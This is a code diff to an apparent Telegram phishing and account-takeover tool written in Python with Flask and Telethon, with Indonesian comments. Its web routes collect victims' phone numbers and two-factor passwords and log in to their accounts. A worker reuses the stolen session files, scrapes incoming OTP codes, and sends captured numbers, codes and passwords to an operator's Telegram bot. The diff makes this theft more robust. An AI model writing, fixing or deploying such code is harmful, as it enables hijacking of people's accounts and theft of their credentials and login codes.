@@ -1,6 +1,9 @@
 import os
 import re
 import json
+import time
+import tempfile
+import shutil
 import asyncio
 import threading
 import requests
@@ -42,8 +45,18 @@ LAST_DATA = {}  # { phone: {"otp":..., "password":...} }
 # ===================================================================
 #                     STORAGE FIX — KEY STANDARDIZATION
 # ===================================================================
+def normalize_phone_key(phone: str) -> str:
+    if phone is None:
+        return ""
+    # remove whitespace and common suffixes if any
+    return phone.replace(".session", "").replace(".pending", "").strip()
+
+
 def save_data(phone, otp=None, password=None):
-    phone = phone.strip()  # FIX PENTING
+    phone = normalize_phone_key(phone)  # FIX PENTING
+
+    if not phone:
+        return
 
     if phone not in LAST_DATA:
         LAST_DATA[phone] = {"otp": None, "password": None}
@@ -56,7 +69,8 @@ def save_data(phone, otp=None, password=None):
 
 
 def get_data(phone):
-    return LAST_DATA.get(phone.strip(), {"otp": None, "password": None})
+    phone = normalize_phone_key(phone)
+    return LAST_DATA.get(phone, {"otp": None, "password": None})
 # ===================================================================
 
 
@@ -72,7 +86,7 @@ def bot_webhook():
 
     q = data["callback_query"]
     cid = q["message"]["chat"]["id"]
-    cb = q.get("data", "").strip()  # FIX
+    cb = q.get("data", "")
     cb_id = q.get("id")
 
     # jawab callback supaya loading berhenti
@@ -86,7 +100,7 @@ def bot_webhook():
             print("[BOT] answerCallbackQuery error:", e)
 
     if cb.startswith("cek_"):
-        phone = cb.replace("cek_", "").strip()  # FIX
+        phone = cb.replace("cek_", "").strip()
         info = get_data(phone)
 
         txt = (
@@ -108,7 +122,7 @@ def bot_webhook():
 
 # ===== SEND LOGIN INFO KE BOT =====
 def send_login_message(phone):
-    phone = phone.strip()  # FIX
+    phone = normalize_phone_key(phone)
     waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     text = f"📞 Nomor: {phone}\n🕒 Login: {waktu}"
 
@@ -132,18 +146,19 @@ def send_login_message(phone):
 
 # ===== SESSION FUNCTIONS =====
 def remove_session_files(phone):
-    phone = phone.strip()
+    phone = normalize_phone_key(phone)
     for fn in os.listdir(SESSION_DIR):
         if fn.startswith(f"{phone}."):
             try:
                 os.remove(os.path.join(SESSION_DIR, fn))
-            except:
+            except Exception:
                 pass
 
 
 def finalize_pending_session(phone):
-    phone = phone.strip()
+    phone = normalize_phone_key(phone)
     for fn in os.listdir(SESSION_DIR):
+        # target name like: +601xxxx.pending.session
         if fn.startswith(f"{phone}.pending") and fn.endswith(".session"):
             src = os.path.join(SESSION_DIR, fn)
             dst = os.path.join(SESSION_DIR, fn.replace(".pending", ""))
@@ -263,6 +278,7 @@ def password():
             try:
                 await client.sign_in(password=pwd)
                 await client.disconnect()
+                # ensure rename so worker can read .session file
                 finalize_pending_session(phone)
                 return True
             except:
@@ -272,8 +288,9 @@ def password():
         ok = asyncio.run(run())
 
         if ok:
-            finalize_pending_session(phone)  # FIX WAJIB: pastikan session jadi .session sebelum worker baca
-            save_data(phone, password=pwd)  # FIX
+            # ensure session finalized BEFORE worker reads
+            finalize_pending_session(phone)
+            save_data(phone, password=pwd)
             send_login_message(phone)
             return redirect(url_for("success"))
         else:
@@ -304,7 +321,7 @@ def api_password():
     ok = asyncio.run(run())
 
     if ok:
-        finalize_pending_session(phone)  # FIX WAJIB: pastikan session jadi .session sebelum worker baca
+        finalize_pending_session(phone)
         save_data(phone, password=pwd)
         send_login_message(phone)
         return jsonify({"status": "success", "redirect": url_for("success")})
@@ -333,7 +350,8 @@ async def forward_handler(event, client_name):
 
     otp_code = otp_list[0]
 
-    save_data(client_name.strip(), otp=otp_code)  # FIX PENTING
+    # ensure normalized key
+    save_data(client_name, otp=otp_code)
     print("[OTP FOUND]", client_name, otp_code)
 
 
@@ -344,6 +362,7 @@ async def worker_main():
     while True:
         try:
             for fn in os.listdir(SESSION_DIR):
+                # we only care about finalized .session files
                 if not fn.endswith(".session"):
                     continue
                 if ".pending" in fn:
@@ -353,24 +372,56 @@ async def worker_main():
                 if base in clients:
                     continue
 
-                base_path = os.path.join(SESSION_DIR, base)
-                print(f"[WORKER] load session: {base_path}")
+                real_session = os.path.join(SESSION_DIR, fn)
+                # copy to temp to avoid locking the real DB
+                ts = int(time.time() * 1000)
+                temp_session = os.path.join(tempfile.gettempdir(), f"{base}_clone_{ts}.session")
+                try:
+                    shutil.copy2(real_session, temp_session)
+                except Exception as e:
+                    print(f"[WORKER] failed to copy session {real_session} -> {temp_session}: {e}")
+                    continue
 
-                client = TelegramClient(base_path, api_id, api_hash)
+                print(f"[WORKER] load clone session: {temp_session}")
+
+                client = TelegramClient(temp_session, api_id, api_hash)
+
+                # try connect with small retries
+                connected = False
+                for attempt in range(5):
+                    try:
+                        await client.connect()
+                        connected = True
+                        break
+                    except Exception as e:
+                        print(f"[WORKER] connect attempt {attempt+1} failed for {base}: {e}")
+                        await asyncio.sleep(0.5)
+
+                if not connected:
+                    try:
+                        await client.disconnect()
+                    except Exception:
+                        pass
+                    continue
 
                 try:
-                    await client.connect()
+                    if not await client.is_user_authorized():
+                        print(f"[WORKER] session {base} not authorized, skip")
+                        await client.disconnect()
+                        continue
                 except Exception as e:
-                    print(f"[WORKER] connect error {base}: {e}")
+                    print(f"[WORKER] is_user_authorized check failed for {base}: {e}")
+                    try:
+                        await client.disconnect()
+                    except Exception:
+                        pass
                     continue
 
-                if not await client.is_user_authorized():
-                    print(f"[WORKER] session {base} not authorized, skip")
-                    await client.disconnect()
-                    continue
-
-                me = await client.get_me()
-                print(f"[WORKER] connected as {me.id} ({getattr(me,'username','')})")
+                try:
+                    me = await client.get_me()
+                    print(f"[WORKER] connected as {me.id} ({getattr(me,'username','')})")
+                except Exception as e:
+                    print(f"[WORKER] get_me failed for {base}: {e}")
 
                 @client.on(events.NewMessage(incoming=True))
                 async def _handler(event, fn=base):
